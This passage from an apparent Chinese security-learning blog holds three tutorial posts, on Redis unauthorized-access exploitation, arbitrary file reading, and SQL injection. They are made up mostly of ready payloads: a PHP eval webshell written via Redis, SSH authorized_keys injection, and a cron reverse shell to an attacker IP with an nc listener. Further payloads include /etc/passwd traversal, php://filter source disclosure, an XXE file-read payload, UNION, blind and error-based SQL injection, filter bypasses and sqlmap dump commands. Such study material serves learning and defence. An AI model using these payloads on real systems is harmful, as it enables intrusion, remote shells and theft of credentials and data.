WebShell</span><br><span class="line">目标IP:6379&gt; SET webshell &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span><br><span class="line"># 保存当前内存数据到磁盘文件（即写入 WebShell）</span><br><span class="line">目标IP:6379&gt; SAVE# 退出目标IP:6379&gt; QUIT</span><br></pre></td></tr></table></figure><p>成功后，可通过浏览器访问 <code>http://&lt;目标IP&gt;/shell.php</code>，并使用中国蚁剑等工具连接。</p><h5 id="3-写入-SSH-公钥"><a href="#3-写入-SSH-公钥" class="headerlink" title="3. 写入 SSH 公钥"></a>3. 写入 SSH 公钥</h5><p>此方法通常需要 ​<strong>Redis 以 root 权限运行</strong>，从而能向 root 用户的 SSH 授权密钥文件写入数据。</p><p>​<strong>利用步骤</strong>​：</p><ol><li><p>​<strong>在攻击机上生成 SSH 密钥对</strong>​（如果还没有）：<br><code>ssh-keygen -t rsa</code><br>这将生成 <code>id_rsa</code>（私钥）和 <code>id_rsa.pub</code>（公钥）。</p></li><li><p>​<strong>将公钥写入特定格式的文件</strong>​（为了处理 Redis 写入的额外字符，通常需要添加换行）：<br>(echo -e “\n\n”; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p></li><li><p>​<strong>通过 Redis 将公钥写入目标机的 authorized_keys 文件</strong>​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#将公钥内容作为值写入 Redis 的一个键</span><br><span class="line">cat key.txt | redis-cli -h &lt;目标IP&gt; -x set ssh_key</span><br><span class="line"># 连接 Redis</span><br><span class="line">redis-cli -h &lt;目标IP&gt;</span><br><span class="line"># 配置 Redis 数据目录为 /root/.ssh/</span><br><span class="line">目标IP:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line"># 设置数据库文件名为 authorized_keys</span><br><span class="line">目标IP:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line"># 保存</span><br><span class="line">目标IP:6379&gt; SAVE</span><br></pre></td></tr></table></figure></li><li></li><li><p>​<strong>使用私钥进行 SSH 免密登录</strong>​：<br>ssh -i ~&#x2F;.ssh&#x2F;id_rsa root@&lt;目标IP&gt;</p></li></ol><h5 id="4-写入定时任务-Crontab"><a href="#4-写入定时任务-Crontab" class="headerlink" title="4. 写入定时任务 (Crontab)"></a>4. 写入定时任务 (Crontab)</h5><p>此方法同样通常需要 ​<strong>Redis 以 root 权限运行</strong>，从而能向系统定时任务目录写入计划任务。</p><p>​<strong>利用步骤</strong>​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#连接至目标 </span><br><span class="line">Redisredis-cli -h &lt;目标IP&gt;</span><br><span class="line"># 配置 Redis 数据目录为定时任务目录（通常是 /var/spool/cron/ 或 /etc/cron.d/）</span><br><span class="line">目标IP:6379&gt; CONFIG SET dir /var/spool/cron</span><br><span class="line"># 设置数据库文件名为对应用户名（例如 root）</span><br><span class="line">目标IP:6379&gt; CONFIG SET dbfilename root</span><br><span class="line"># 写入一个每分钟执行一次的反向 Shell 命令</span><br><span class="line"># 注意：这里的 IP 和端口需要替换为你的攻击机监听地址和端口</span><br><span class="line">目标IP:6379&gt; SET revshell &quot;\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;你的IP&gt;/&lt;你的端口&gt; 0&gt;&amp;1\n\n&quot;</span><br><span class="line"># 保存</span><br><span class="line">目标IP:6379&gt; SAVE</span><br><span class="line"></span><br><span class="line">同时在你的攻击机上监听指定端口：nc -lvnp &lt;你的端口&gt;</span><br></pre></td></tr></table></figure><h5 id="5-主从复制利用"><a href="#5-主从复制利用" class="headerlink" title="5. 主从复制利用"></a>5. 主从复制利用</h5><p>这种方法更为高级，通过让目标 Redis 服务器作为从节点同步来自攻击者控制的恶意主节点的数据，从而加载恶意的 Redis 模块来实现远程代码执行。</p><ul><li><p>​<strong>利用思路</strong>​：</p><ol><li><p>攻击者在自己的机器上搭建一个恶意的 Redis 主服务器，并准备好包含恶意代码的 RDB 文件。</p></li><li><p>通过未授权访问等方式，让目标 Redis 执行 <code>SLAVEOF &lt;攻击者IP&gt; 6379</code>命令，使其成为恶意主节点的从节点。</p></li><li><p>目标 Redis 会同步恶意主节点的数据，加载恶意 RDB 文件，从而执行预设的代码。<br>通常会使用自动化工具（如 <code>redis-rogue-server</code>）来完成<br>。</p></li></ol></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>任意文件读取漏洞</title>
      <link href="/2025/09/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/09/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>攻击者利用一些手段读取服务器上开发者不允许读到的文件，常作为资产信息搜集的重要手段，在每种可部署到web应用程序的程序语言中几乎都存在</strong></p><hr><h2 id="任意文件读取漏洞常见触发点"><a href="#任意文件读取漏洞常见触发点" class="headerlink" title="任意文件读取漏洞常见触发点"></a>任意文件读取漏洞常见触发点</h2><h3 id="web语言"><a href="#web语言" class="headerlink" title="web语言"></a>web语言</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><h5 id="有关文件读取函数"><a href="#有关文件读取函数" class="headerlink" title="有关文件读取函数"></a>有关文件读取函数</h5><p><code>file_get_content()</code>,<code>file()</code>,<code>fopen()</code>函数及其文件指针操作函数<code>fread()</code>,<code>fgets()</code>等</p><h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><p><code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>等</p><h5 id="PHP系统命令"><a href="#PHP系统命令" class="headerlink" title="PHP系统命令:"></a>PHP系统命令:</h5><p><code>exec()</code>,<code>system()</code>等</p><h5 id="PHP协议-wrapper"><a href="#PHP协议-wrapper" class="headerlink" title="PHP协议-wrapper:"></a>PHP协议-wrapper:</h5><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://host:port/xxx --通过http协议访问远程服务器上对应的文件</span><br><span class="line">php://协议</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?p=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">#利用php的filter机制在页面输出想要的文件的base64编码</span><br></pre></td></tr></table></figure><h3 id="PHP攻击姿势"><a href="#PHP攻击姿势" class="headerlink" title="PHP攻击姿势"></a>PHP攻击姿势</h3><p>经典攻击​：<code>http://网站.com/download.php?file=../../../../etc/passwd</code></p><p>​PHP​：用 <code>php://filter</code>协议把文件用Base64编码读出来，避免代码执行，直接看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://网站.com/index.php?page=php://filter/convert.base64-encode/resource=config.php</span><br><span class="line">#拿到Base64编码后的内容，解码一下就能看到源码里的数据库密码</span><br></pre></td></tr></table></figure><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p><strong>容易出现读取非预期文件的情况</strong></p><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p><code>FileInputStream</code>,<code>XXE</code>文件读取函数导致的漏洞以及Java有些模块也支持<code>file://</code>协议</p><h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><p><strong>解析XML时，如果没配置好，攻击者可以构造一个特殊的XML，让服务器去读任意文件。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line">#如果解析,文件将会被输出到&lt;root&gt;标签里</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h5><p><code>Rails</code>框架导致漏洞</p><h5 id="node"><a href="#node" class="headerlink" title="node"></a>node</h5><p><code>express</code>模块导致漏洞</p><h3 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件&#x2F;服务器相关"></a>中间件&#x2F;服务器相关</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h4><p>配置<code>alias</code>时没写对，就会产生路径穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files/ &#123;</span><br><span class="line">    alias /var/www/uploads/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>怎么利用？​</strong>​：访问 <code>http://网站.com/files../etc/passwd</code></p><p>Nginx会把<code>/files</code>替换成<code>/var/www/uploads/</code>，拼出来就成了<code>/var/www/uploads/../etc/passwd</code>，也就是<code>/var/www/etc/passwd</code>。如果这个文件不存在，可能就直接返回错误信息，泄露了部分路径。</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p><strong>MySQL</strong>​：如果数据库用户权限很高（有FILE权限），可以利用SQL注入执行<code>LOAD_FILE()</code>函数读文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://网站.com/news.php?id=1 UNION SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)--+</span><br></pre></td></tr></table></figure><p>​<strong>PostgreSQL</strong>​：类似，用<code>pg_read_file()</code>函数。</p><h4 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h4><p>如果网站允许用户上传文件，攻击者可以上传一个<strong>软链接文件</strong>​（类似于Windows的快捷方式），这个链接指向<code>/etc/passwd</code>等敏感文件。如果网站提供了“下载”功能，且没有判断文件类型，就可能直接把这个软链接指向的真实文件给下载下来。</p><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><h4 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker-API"></a>Docker-API</h4><p>如果服务器的Docker端口（2375）暴露在外且没设置密码，攻击者可以远程控制Docker，然后启动一个容器，把宿主机的根目录<code>/</code>挂载到容器里，然后直接读宿主机的所有文件。</p><h3 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h3><h4 id="浏览器-Flash-XSS"><a href="#浏览器-Flash-XSS" class="headerlink" title="浏览器&#x2F;Flash XSS"></a>浏览器&#x2F;Flash XSS</h4><h5 id="浏览器-XSS​"><a href="#浏览器-XSS​" class="headerlink" title="浏览器&#x2F;XSS​"></a><strong>浏览器&#x2F;XSS</strong>​</h5><p>XSS本身不能读服务器上的文件，但它可以：</p><ul><li><p>读取用户浏览器里缓存的数据。</p></li><li><p>诱导用户上传文件，然后偷偷把文件内容发到攻击者的服务器（比如读取用户的敏感文档）。</p></li></ul><h4 id="MarkDown语法解析器-XSS"><a href="#MarkDown语法解析器-XSS" class="headerlink" title="MarkDown语法解析器 XSS"></a>MarkDown语法解析器 XSS</h4><p>有些网站允许你用Markdown语法写文章，但它的解析器不够安全，没能过滤掉危险的代码。<br>    <a href="javascript:alert('是的这是一个弹窗')">这是个链接</a></p><p>探测</p><h3 id="案例说明"><a href="#案例说明" class="headerlink" title="案例说明"></a>案例说明</h3><p>问题:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/resources/images/rating1.png&quot;</span>&gt;</span> #说明内部资源是通过系统文件查询的</span><br></pre></td></tr></table></figure><p>F12查看页面源代码</p><p>解决方案:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用brup suite截取获取这张图片的请求,更改报文中,filename=/resources/images/rating1.png的请求,改编为filename=../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>提升:</p><p><strong>如果网站禁用了遍历序列,可以尝试用绝对地址&#x2F;etc&#x2F;passwd</strong></p><h2 id="附言"><a href="#附言" class="headerlink" title="附言"></a>附言</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../ #表示返回上一级目录,而/var/www/一般会是目录路径,所以使用多个../返回如果不保险可以使用多个</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入--基础篇</title>
      <link href="/2025/09/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
      <url>/2025/09/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><hr><h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><p>对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术</p><h3 id="SQL注入技巧"><a href="#SQL注入技巧" class="headerlink" title="SQL注入技巧"></a>SQL注入技巧</h3><ul><li>判断列数:<code>order by 5 --+</code></li></ul><h3 id="闭合符号的判断"><a href="#闭合符号的判断" class="headerlink" title="闭合符号的判断"></a>闭合符号的判断</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><pre><code>id=1 and 1=2 </code></pre><p>判断是否是数字型,如果通过无闭合符号</p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><pre><code> 1&#39; and &#39;1&#39;=&#39;1  ，1&#39; and &#39;1&#39;=&#39;2</code></pre><p>判断是否是字符型</p><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><pre><code> 某个商品名称%&#39; and 1=1 and &#39;%&#39;=&#39;  （这个语句的功能就相当于普通SQL注入的 and 1=1）</code></pre><p>因为,SQL的格式是<br>    select * from database.table where users like ‘%某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’%’</p><h4 id="其他常见闭合"><a href="#其他常见闭合" class="headerlink" title="其他常见闭合"></a>其他常见闭合</h4><pre><code>(&#39;&#39;) or (&quot;&quot;) </code></pre><h3 id="数字型注入和union注入"><a href="#数字型注入和union注入" class="headerlink" title="数字型注入和union注入"></a>数字型注入和union注入</h3><h4 id="判断手段"><a href="#判断手段" class="headerlink" title="判断手段"></a>判断手段</h4><p>在url中<code>id=1</code>改变为<code>id=2-1</code></p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p><strong>基本查询手段</strong>：后缀<code>union seclect users,pwds from wp_users</code></p><p><strong>破解表名·字段</strong>：<code>table_name</code>–表名</p><p>                            <code>table_schema</code>–数据库名</p><p>                            <code>information_schema</code>–所有表名,字段,数据库</p><p>因此<strong>查询表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><p>        <strong>查询字段</strong>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;wp_users&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>附言</strong>:<code>limit1,1</code>限制查询手段,取查询结果中第一条数据之后的第一条数据</p><h3 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h3><h4 id="字符型-判断手段"><a href="#字符型-判断手段" class="headerlink" title="字符型 判断手段"></a>字符型 判断手段</h4><p>在url中改变<code>id=3-1</code>无效,但是改变为<code>id=2a</code>有效时,SQL强制将<code>2a</code>转换为<code>2</code>,<code>a</code>被强制转换为<code>0</code></p><h4 id="字符型-利用方式"><a href="#字符型-利用方式" class="headerlink" title="字符型 利用方式"></a>字符型 利用方式</h4><p>在url中用单引号闭合前面的单引号,再用#(<code>%23</code>或<code>--%20</code>)去注释掉后面的语句,但是所用格式应该要是url编码</p><p>例如<code>id=2%27%23</code></p><p>空格–<code>%20</code></p><p>单引号–<code>%27</code></p><p>#–<code>%23</code></p><p>查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(<span class="keyword">user</span>,<span class="number">0x7e</span>,pwd)) <span class="keyword">from</span> wp_user limit <span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>但这样只会输出单一数据,如果想要输出完整数据:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(username,<span class="number">0x7e</span>,password)) <span class="keyword">from</span> database_name.tablename <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="布尔盲注技术"><a href="#布尔盲注技术" class="headerlink" title="布尔盲注技术"></a>布尔盲注技术</h4><p><strong>单一字符</strong>:通过<code>and</code>逻辑运算符连接<code>id=1&#39; and &#39;f&#39;&lt;&#39;n&#39;</code> 前者为真,所以判断后者即可,利用二分完成</p><p><strong>长数据</strong>:利用<code>mid(),substring(),substr()</code>函数进行操作即可.<br>    实际案例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/example.php?id=1&#x27; and(select(mid(select concat(user,0x7e,pwd) from wp_user),1,1)) = &#x27;a&#x27;</span><br><span class="line">#其中的第一个1表示数据的第一位,判断是否第一位是a</span><br></pre></td></tr></table></figure><h4 id="时间盲注技术"><a href="#时间盲注技术" class="headerlink" title="时间盲注技术"></a>时间盲注技术</h4><p>其本质与布尔盲注一致</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>为了方便调试,有的网站会开启错误调试信息,只要利用注入手段让页面上显示错误信息,内容是执行sql语句后的结果</p><p><strong>实际案例:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23</span></span><br></pre></td></tr></table></figure><hr><h2 id="SQL注入点"><a href="#SQL注入点" class="headerlink" title="SQL注入点"></a>SQL注入点</h2><h3 id="SELECT注入"><a href="#SELECT注入" class="headerlink" title="SELECT注入"></a>SELECT注入</h3><h4 id="注入点在select-expr"><a href="#注入点在select-expr" class="headerlink" title="注入点在select_expr"></a>注入点在select_expr</h4><p>可以使用时间盲注的方法,也可以用<code>as</code>别名的方式注入</p><p>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="keyword">select</span> pwd <span class="keyword">from</span> users) <span class="keyword">as</span> title</span><br></pre></td></tr></table></figure><h4 id="注入点在table-reference"><a href="#注入点在table-reference" class="headerlink" title="注入点在table_reference"></a>注入点在table_reference</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依然可以用<span class="keyword">as</span>别名的方式进行注入</span><br></pre></td></tr></table></figure><h3 id="注入点在where或者having之后"><a href="#注入点在where或者having之后" class="headerlink" title="注入点在where或者having之后"></a>注入点在where或者having之后</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">判断有无引号包括使用基础注入手段,例如<span class="keyword">union</span>即可</span><br></pre></td></tr></table></figure><h3 id="注入点在group-by或者order-by之后"><a href="#注入点在group-by或者order-by之后" class="headerlink" title="注入点在group by或者order by之后"></a>注入点在group by或者order by之后</h3><p>针对性测试,利用时间盲注手段也可.</p><h3 id="注入点在limit之后"><a href="#注入点在limit之后" class="headerlink" title="注入点在limit之后"></a>注入点在limit之后</h3><p>略</p><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><h4 id="注入点位于tbl-name"><a href="#注入点位于tbl-name" class="headerlink" title="注入点位于tbl_name"></a>注入点位于tbl_name</h4><p>通过注释掉后面的语句尝试直接插入特定的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">table</span><span class="operator">=</span>users <span class="keyword">values</span>(<span class="number">20</span>,<span class="string">&#x27;newadmin&#x27;</span>,<span class="string">&#x27;newpass&#x27;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="注入点位于values"><a href="#注入点位于values" class="headerlink" title="注入点位于values"></a>注入点位于values</h4><p>例如下面这种情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users <span class="keyword">values</span>(<span class="number">20</span>,<span class="string">&#x27;newadmin&#x27;</span>,<span class="string">&#x27;可控位置&#x27;</span>)</span><br></pre></td></tr></table></figure><p>往里面直接插入select语句即可,但查询结果必须是单个元素</p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>可利用修改多个字段的数据</p><h3 id="其他注入点"><a href="#其他注入点" class="headerlink" title="其他注入点"></a>其他注入点</h3><p>利用方式与select相似</p><h2 id="注入绕过和防御手段"><a href="#注入绕过和防御手段" class="headerlink" title="注入绕过和防御手段"></a>注入绕过和防御手段</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>空格包括它的url码被替换成其他字符的情况</p><p>原sql代码案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id<span class="operator">=</span>str_replace(&quot; &quot;,&quot;&quot;,$id);</span><br></pre></td></tr></table></figure><p>此时能够代替空格的空白字符有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">%0c</span><br><span class="line">%0d</span><br><span class="line">%09</span><br><span class="line">%a0 (在特定字符集才可使用)</span><br><span class="line">以及/**/和括号等</span><br></pre></td></tr></table></figure><h3 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h3><p>将select字符转化为空的情况,可以使用双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">-</span><span class="operator">&gt;</span> selselectect</span><br></pre></td></tr></table></figure><h3 id="大小写匹配"><a href="#大小写匹配" class="headerlink" title="大小写匹配"></a>大小写匹配</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大小写混写绕过: <span class="keyword">seLeCt</span></span><br></pre></td></tr></table></figure><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>正则匹配关键字<code>\bselect\b</code>可用形如<code>/*!50000select*/</code>的方式绕过</p><h3 id="替换了单引号或双引号-忘记反斜杠"><a href="#替换了单引号或双引号-忘记反斜杠" class="headerlink" title="替换了单引号或双引号,忘记反斜杠"></a>替换了单引号或双引号,忘记反斜杠</h3><p>在第一个控制点输入<code>\</code>在第二个可控点输入<code>--+</code>,使第二个可控点逃狱</p><h2 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h2><p>注入的重点在逃逸引号,如果开发者提前将所有字符转义,还有一些特殊情况可以完成注入</p><h3 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h3><h3 id="特异注入点"><a href="#特异注入点" class="headerlink" title="特异注入点"></a>特异注入点</h3><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="字符串截断"><a href="#字符串截断" class="headerlink" title="字符串截断"></a>字符串截断</h3><h2 id="SQLMAP工具使用"><a href="#SQLMAP工具使用" class="headerlink" title="SQLMAP工具使用"></a>SQLMAP工具使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址url #查看注入点</span><br><span class="line">sqlmap -u 网址url --dbs #查看所有数据库</span><br><span class="line">sqlmap -u 网址url --current-db #查看当前使用的数据库</span><br><span class="line">sqlmap -u 网址url -D &#x27;数据库名&#x27; --tables #查看表名</span><br><span class="line">sqlmap -u 网址url -D &#x27;数据库名&#x27; -T &#x27;表名&#x27; --columns #查看字段</span><br><span class="line">sqlmap -u 网址url -D &#x27;数据库名&#x27; -T &#x27;表名&#x27; --dump #查看数据</span><br><span class="line">#这些是基本操作,其余请自主查询</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install sqlmap #下载方式直接在kali中命令行下载即可,面对一些工具下载慢的问题请及时kali换源</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#关于注入点的判断sqlmap中也会有显示</span><br></pre></td></tr></table></figure><hr><h2 id="附言"><a href="#附言" class="headerlink" title="附言"></a>附言</h2><h3 id="UNION注入需要注意的事项"><a href="#UNION注入需要注意的事项" class="headerlink" title="UNION注入需要注意的事项:"></a>UNION注入需要注意的事项:</h3><p>UNION联合注入需要保持列数一致性,也就是UNION SELECT 后面的值需要是子查询或其他的形式,如果是group_concat则是一个完整的查询语句,会有语法上的错误</p><p>只有 ​<strong>返回单行单列值（标量）的表达式</strong>​ 才能作为 <code>UNION</code>的列值。常见形式包括：</p><h4 id="​1-子查询（Subquery）​​"><a href="#​1-子查询（Subquery）​​" class="headerlink" title="​1. 子查询（Subquery）​​"></a>​1. 子查询（Subquery）​​</h4><pre><code>SELECT 1, (SELECT group_concat(table_name) FROM ...), 3</code></pre><ul><li>​<strong>要求</strong>​：子查询必须返回 ​<strong>单行单列值</strong>​（如聚合函数 <code>GROUP_CONCAT()</code>、<code>COUNT()</code>）。</li></ul><h4 id="​2-标量函数（Scalar-Functions）"><a href="#​2-标量函数（Scalar-Functions）" class="headerlink" title="​2. 标量函数（Scalar Functions）"></a>​2. 标量函数（Scalar Functions）</h4><pre><code>SELECT 1, database(), 3                -- 返回当前数据库名（单值）SELECT 1, CONCAT(user(), &#39;@&#39;, host()), 3 -- 拼接字符串（单值）</code></pre><h4 id="​3-字面量（Literals）或列引用"><a href="#​3-字面量（Literals）或列引用" class="headerlink" title="​3. 字面量（Literals）或列引用"></a>​3. 字面量（Literals）或列引用</h4><pre><code>SELECT 1, &#39;text&#39;, 3         -- 字符串字面量SELECT 1, column_name, 3    -- 引用表中的列</code></pre><h4 id="​4-条件表达式（CASE-IF）​​"><a href="#​4-条件表达式（CASE-IF）​​" class="headerlink" title="​4. 条件表达式（CASE&#x2F;IF）​​"></a>​4. 条件表达式（CASE&#x2F;IF）​​</h4><pre><code>SELECT 1, CASE WHEN ... THEN &#39;A&#39; ELSE &#39;B&#39; END, 3    </code></pre><h4 id="​总结​"><a href="#​总结​" class="headerlink" 